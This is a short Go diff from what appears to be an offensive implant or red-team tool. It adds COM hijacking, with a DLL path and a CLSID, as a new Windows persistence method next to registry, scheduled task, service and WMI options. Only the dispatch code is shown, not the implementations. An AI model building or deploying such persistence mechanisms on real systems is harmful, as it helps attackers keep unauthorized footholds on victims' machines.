@@ -27,10 +27,15 @@ func persistMethod(method, cmd, name string) (string, error) {
 		return persistService(cmd, name)
 	case "wmi":
 		return persistWMI(cmd, name)
+	case "comhijack", "com":
+		// cmd = dllPath, name = CLSID
+		return comHijack(name, cmd, "")
+	case "comhijack-rm", "com-rm":
+		return comHijackRemove(name)
 	case "rm", "remove", "uninstall":
 		return persistRemove(name)
 	default:
-		return "", fmt.Errorf("unknown persistence method: %s (windows: registry|schtask|startup|service|wmi|rm)", method)
+		return "", fmt.Errorf("unknown persistence method: %s (windows: registry|schtask|startup|service|wmi|comhijack|rm)", method)
 	}
 }
 
